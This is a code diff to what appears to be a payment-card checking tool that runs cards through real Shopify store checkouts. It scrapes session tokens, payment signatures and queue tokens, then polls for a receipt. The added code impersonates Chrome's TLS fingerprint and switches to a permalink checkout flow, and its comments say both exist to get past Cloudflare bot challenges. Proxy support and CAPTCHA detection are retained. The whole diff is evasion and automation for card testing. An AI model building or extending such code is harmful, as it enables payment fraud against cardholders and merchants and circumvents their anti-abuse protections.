@@ -57,6 +57,97 @@ class CheckResult:
     card: Card
 
 
+# ═════════════════════════════════════════════════════════════════════════
+# curl_cffi shim — Chrome TLS impersonation defeats Cloudflare fingerprinting
+# (aiohttp/requests get 429-challenged on protected stores; Chrome JA3 passes)
+# ═════════════════════════════════════════════════════════════════════════
+
+class _CffiResponse:
+    """Wraps a curl_cffi response to look like an aiohttp response."""
+    def __init__(self, resp):
+        self._r = resp
+        self.status = resp.status_code
+        self.url = str(resp.url)
+        self.cookies = resp.cookies
+        self.headers = resp.headers
+
+    async def json(self):
+        return self._r.json()
+
+    async def text(self):
+        return self._r.text
+
+    async def read(self):
+        return self._r.content
+
+
+class _CffiRequestCtx:
+    """Allows `async with session.get(...) as r:` syntax."""
+    def __init__(self, coro):
+        self._coro = coro
+
+    def __await__(self):
+        return self._coro.__await__()
+
+    async def __aenter__(self):
+        resp = await self._coro
+        return _CffiResponse(resp)
+
+    async def __aexit__(self, *exc):
+        return False
+
+
+class CffiClientSession:
+    """Drop-in replacement for aiohttp.ClientSession backed by curl_cffi
+    with Chrome TLS impersonation (bypasses Cloudflare TLS fingerprinting)."""
+
+    def __init__(self, proxy: Optional[str] = None, timeout: int = 20, **kwargs):
+        from curl_cffi.requests import AsyncSession
+        proxies = None
+        if proxy:
+            proxies = {"http": proxy, "https": proxy}
+        self._session = AsyncSession(
+            impersonate="chrome",
+            proxies=proxies,
+            timeout=timeout,
+            max_redirects=10,
+        )
+
+    def _convert_kwargs(self, kwargs: dict) -> dict:
+        out = {}
+        for k, v in kwargs.items():
+            if k == "timeout":
+                if hasattr(v, "total"):
+                    out["timeout"] = v.total
+                else:
+                    out["timeout"] = v
+            elif k == "allow_redirects":
+                out["allow_redirects"] = v
+            elif k in ("headers", "data", "json", "params"):
+                out[k] = v
+            # silently drop aiohttp-only kwargs (connector, proxy per-req, ssl, etc.)
+        return out
+
+    def get(self, url, **kwargs):
+        return _CffiRequestCtx(self._session.get(url, **self._convert_kwargs(kwargs)))
+
+    def post(self, url, **kwargs):
+        return _CffiRequestCtx(self._session.post(url, **self._convert_kwargs(kwargs)))
+
+    async def close(self):
+        try:
+            await self._session.close()
+        except Exception:
+            pass
+
+    async def __aenter__(self):
+        return self
+
+    async def __aexit__(self, *exc):
+        await self.close()
+        return False
+
+
 async def shopify_check(
     card: Card,
     store_url: str,
@@ -92,13 +183,12 @@ async def _do_shopify_check(
     base_headers["priority"] = "u=1, i"
 
     conn_timeout = aiohttp.ClientTimeout(total=timeout)
-    connector = _get_shared_connector()
-    session_kwargs = {"timeout": conn_timeout, "connector": connector}
+    session_kwargs = {"timeout": timeout}
     if proxy:
         session_kwargs["proxy"] = proxy
 
     try:
-        async with aiohttp.ClientSession(**session_kwargs) as session:
+        async with CffiClientSession(**session_kwargs) as session:
             ctx = _CheckoutContext(store_url, prof, base_headers)
             ctx._proxy = proxy
 
@@ -424,23 +514,44 @@ async def _add_to_cart(session, ctx: _CheckoutContext) -> bool:
 
 
 async def _start_checkout(session, ctx: _CheckoutContext) -> bool:
-    """Step 4: Start checkout via POST /cart and handle JS redirect chains."""
+    """Step 4: Start checkout via permalink (chk.php-style) with POST /cart fallback."""
     headers = ctx.headers.copy()
     headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
+    headers["sec-fetch-dest"] = "document"
+    headers["sec-fetch-mode"] = "navigate"
+    headers["sec-fetch-site"] = "none"
+    headers["sec-fetch-user"] = "?1"
+    headers["upgrade-insecure-requests"] = "1"
+
+    # ── PRIMARY: permalink checkout (like chk.php — GET /cart/{variant}:1) ──
+    # Single request lands directly on checkout page; never triggers CF POST challenge.
+    try:
+        permalink = f"{ctx.base_url}/cart/{ctx.variant_id}:1"
+        async with session.get(permalink, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=20)) as r:
+            ctx.checkout_url = str(r.url)
+            html = await r.text()
+            ctx.last_html = html
+
+            if r.status == 200 and "captcha" not in html.lower() and "challenge-platform" not in html.lower():
+                match = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", ctx.checkout_url)
+                if match:
+                    ctx.checkout_id = match.group(1)
+                    return True
+            logger.debug("permalink checkout got status %s, trying POST /cart", r.status)
+    except Exception as e:
+        logger.debug("permalink checkout failed for %s: %s", ctx.base_url, e)
+
+    # ── FALLBACK: classic POST /cart flow ──
     headers["content-type"] = "application/x-www-form-urlencoded"
     headers["cache-control"] = "max-age=0"
     headers["origin"] = ctx.base_url
     headers["referer"] = f"{ctx.base_url}/cart"
-    headers["sec-fetch-dest"] = "document"
-    headers["sec-fetch-mode"] = "navigate"
-    headers["sec-fetch-user"] = "?1"
-    headers["upgrade-insecure-requests"] = "1"
     data = f"updates%5B%5D=1&checkout=&cart_token={ctx.cart_token or ''}"
-    
+
     current_url = f"{ctx.base_url}/cart"
     method = "POST"
     payload = data
-    
+
     try:
         # Allow up to 3 JS redirects
         for _ in range(3):
@@ -448,29 +559,16 @@ async def _start_checkout(session, ctx: _CheckoutContext) -> bool:
                 r = await session.post(current_url, data=payload, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15))
             else:
                 r = await session.get(current_url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15))
-                
+
             ctx.checkout_url = str(r.url)
             html = await r.text()
             ctx.last_html = html
-            
+
             # Check for CAPTCHA/checkpoint
             if "captcha" in html.lower() or "datadome" in html.lower() or ("cloudflare" in html.lower() and "challenge" in html.lower()):
                 logger.warning("Checkpoint/CAPTCHA detected on %s during checkout start", current_url)
-                # Fallback to permalink checkout if blocked
-                permalink = f"{ctx.base_url}/cart/{ctx.variant_id}:1"
-                try:
-                    r_pl = await session.get(permalink, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15))
-                    ctx.checkout_url = str(r_pl.url)
-                    html = await r_pl.text()
-                    ctx.last_html = html
-                    match = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", ctx.checkout_url)
-                    if match and "captcha" not in html.lower() and "challenge" not in html.lower():
-                        ctx.checkout_id = match.group(1)
-                        return True
-                except Exception:
-                    pass
                 return False
-            
+
             # Check for JS redirects (e.g. window.location.href = '...')
             js_redirect_match = re.search(r'window\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', html)
             if js_redirect_match:
@@ -483,15 +581,15 @@ async def _start_checkout(session, ctx: _CheckoutContext) -> bool:
                 payload = None
                 headers["referer"] = ctx.checkout_url
                 continue
-                
+
             match = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", ctx.checkout_url)
             if match:
                 ctx.checkout_id = match.group(1)
                 return True
-                
+
             # If we don't have a checkout_id but we didn't hit a JS redirect, we might be stuck
             break
-            
+
         return False
     except Exception as e:
         logger.debug("start_checkout failed for %s: %s", ctx.base_url, e)
@@ -504,104 +602,106 @@ async def _get_checkout_metadata(session, ctx: _CheckoutContext) -> bool:
     headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
     headers["sec-fetch-dest"] = "document"
     headers["sec-fetch-mode"] = "navigate"
-    headers["sec-fetch-site"] = "same-origin"
-    headers["upgrade-insecure-requests"] = "1"
     try:
-        async with session.get(ctx.checkout_url, headers=headers) as r:
-            html = await r.text()
-            soup = BeautifulSoup(html, 'html.parser')
+        # Reuse checkout HTML if we already have it (from permalink flow)
+        if ctx.last_html and "serialized-session" in ctx.last_html:
+            html = ctx.last_html
+        else:
+            async with session.get(ctx.checkout_url, headers=headers) as r:
+                html = await r.text()
+        soup = BeautifulSoup(html, 'html.parser')
 
-            # 1. sessionToken (usually in a meta tag or script)
-            meta_token = soup.find('meta', {'name': 'serialized-sessionToken'})
-            if meta_token and meta_token.get('content'):
-                ctx.session_token = meta_token['content'].strip('"&quot;')
-                
-            # Check for Captcha/Datadome
-            if "captcha" in html.lower() or "datadome" in html.lower() or "cloudflare" in html.lower() and "challenge" in html.lower():
-                logger.warning("Checkpoint/CAPTCHA detected on %s", ctx.checkout_url)
-                return False
-                
-            # Extract all script tags for JSON/JS variables
-            scripts_text = " ".join([script.string for script in soup.find_all('script') if script.string])
+        # 1. sessionToken (usually in a meta tag or script)
+        meta_token = soup.find('meta', {'name': 'serialized-sessionToken'})
+        if meta_token and meta_token.get('content'):
+            ctx.session_token = meta_token['content'].strip('"&quot;')
+    
+        # Check for Captcha/Datadome
+        if "captcha" in html.lower() or "datadome" in html.lower() or "cloudflare" in html.lower() and "challenge" in html.lower():
+            logger.warning("Checkpoint/CAPTCHA detected on %s", ctx.checkout_url)
+            return False
+    
+        # Extract all script tags for JSON/JS variables
+        scripts_text = " ".join([script.string for script in soup.find_all('script') if script.string])
 
-            if not ctx.session_token:
-                for pat in [
-                    r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
-                    r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
-                    r'sessionToken[\s:=]+["\']?(AAEB[A-Za-z0-9_\-]+)',
-                    r'(AAEB[A-Za-z0-9_\-]{30,})',
-                ]:
-                    m = re.search(pat, html)
-                    if m:
-                        ctx.session_token = m.group(1)
-                        break
-
-            # 2. signature
+        if not ctx.session_token:
             for pat in [
-                r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
-                r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
-                r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
-                r'"signature"\s*:\s*"(eyJ[^"]+)"',
-                r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
+                r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
+                r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
+                r'sessionToken[\s:=]+["\']?(AAEB[A-Za-z0-9_\-]+)',
+                r'(AAEB[A-Za-z0-9_\-]{30,})',
             ]:
-                m = re.search(pat, scripts_text) or re.search(pat, html)
+                m = re.search(pat, html)
                 if m:
-                    ctx.signature = m.group(1)
+                    ctx.session_token = m.group(1)
                     break
 
-            # 3. stableId
-            for pat in [
-                r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
-                r'stableId[\s:=]+["\']([0-9a-f-]{36})',
-            ]:
-                m = re.search(pat, scripts_text) or re.search(pat, html)
-                if m:
-                    ctx.stable_id = m.group(1)
-                    break
+        # 2. signature
+        for pat in [
+            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
+            r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
+            r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
+            r'"signature"\s*:\s*"(eyJ[^"]+)"',
+            r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
+        ]:
+            m = re.search(pat, scripts_text) or re.search(pat, html)
+            if m:
+                ctx.signature = m.group(1)
+                break
 
-            # 4. queueToken
-            m = re.search(r'queueToken(?:&quot;|")\s*(?::|=>)\s*(?:&quot;|")([^"&]+)(?:&quot;|")', html)
-            if not m:
-                m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', scripts_text)
-            ctx.queue_token = m.group(1) if m else None
+        # 3. stableId
+        for pat in [
+            r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
+            r'stableId[\s:=]+["\']([0-9a-f-]{36})',
+        ]:
+            m = re.search(pat, scripts_text) or re.search(pat, html)
+            if m:
+                ctx.stable_id = m.group(1)
+                break
 
-            # 5. paymentMethodIdentifier
-            m = re.search(r'paymentMethodIdentifier(?:&quot;|")\s*(?::|=>)\s*(?:&quot;|")([^"&]+)(?:&quot;|")', html)
-            if not m:
-                m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', scripts_text)
-            ctx.payment_method_identifier = m.group(1) if m else None
+        # 4. queueToken
+        m = re.search(r'queueToken(?:&quot;|")\s*(?::|=>)\s*(?:&quot;|")([^"&]+)(?:&quot;|")', html)
+        if not m:
+            m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', scripts_text)
+        ctx.queue_token = m.group(1) if m else None
 
-            # 6. shopId
-            m = re.search(r'"shopId"\s*:\s*(\d+)', scripts_text)
-            if not m:
-                m = re.search(r'shop_id[\s:=]+(\d+)', html)
-            ctx.shop_id = m.group(1) if m else "25603230"
+        # 5. paymentMethodIdentifier
+        m = re.search(r'paymentMethodIdentifier(?:&quot;|")\s*(?::|=>)\s*(?:&quot;|")([^"&]+)(?:&quot;|")', html)
+        if not m:
+            m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', scripts_text)
+        ctx.payment_method_identifier = m.group(1) if m else None
 
-            # 7. buildId
-            m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', scripts_text)
-            if not m:
-                m = re.search(r'/build/([a-f0-9]{40})/', html)
-            ctx.build_id = m.group(1) if m else ctx.build_id
+        # 6. shopId
+        m = re.search(r'"shopId"\s*:\s*(\d+)', scripts_text)
+        if not m:
+            m = re.search(r'shop_id[\s:=]+(\d+)', html)
+        ctx.shop_id = m.group(1) if m else "25603230"
 
-            # 8. PCI build hash
-            pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
-            ctx.pci_build_hash = pci_m.group(1) if pci_m else ctx.pci_build_hash
+        # 7. buildId
+        m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', scripts_text)
+        if not m:
+            m = re.search(r'/build/([a-f0-9]{40})/', html)
+        ctx.build_id = m.group(1) if m else ctx.build_id
 
-            # 9. signedHandles
-            signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', scripts_text)
-            if not signed_handles:
-                raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
-                signed_handles = [h.replace("\\n", "").replace("\\r", "") for h in raw]
-            ctx.signed_handles = signed_handles
+        # 8. PCI build hash
+        pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
+        ctx.pci_build_hash = pci_m.group(1) if pci_m else ctx.pci_build_hash
 
-            # 10. graphql base
-            parsed = urlparse(ctx.checkout_url)
-            if "shopify.com" in parsed.netloc and "checkout." in parsed.netloc:
-                ctx.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
-            else:
-                ctx.graphql_base = ctx.base_url
+        # 9. signedHandles
+        signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', scripts_text)
+        if not signed_handles:
+            raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
+            signed_handles = [h.replace("\\n", "").replace("\\r", "") for h in raw]
+        ctx.signed_handles = signed_handles
 
-            return bool(ctx.session_token)
+        # 10. graphql base
+        parsed = urlparse(ctx.checkout_url)
+        if "shopify.com" in parsed.netloc and "checkout." in parsed.netloc:
+            ctx.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
+        else:
+            ctx.graphql_base = ctx.base_url
+
+        return bool(ctx.session_token)
     except Exception as e:
         logger.debug("get_checkout_metadata failed: %s", e)
         return False
@@ -1245,15 +1345,11 @@ async def _poll_for_receipt(session, ctx: _CheckoutContext, receipt_id: str, car
     }
 
     # Create a separate session with long timeout for polling
-    poll_connector = _get_shared_connector()
-    poll_session_kwargs = {
-        "timeout": aiohttp.ClientTimeout(total=120),
-        "connector": poll_connector,
-    }
+    poll_session_kwargs = {"timeout": 120}
     if ctx._proxy:
         poll_session_kwargs["proxy"] = ctx._proxy
 
-    async with aiohttp.ClientSession(**poll_session_kwargs) as poll_session:
+    async with CffiClientSession(**poll_session_kwargs) as poll_session:
         for i in range(15):
             try:
                 async with poll_session.post(url, json=poll_payload, headers=headers) as r:
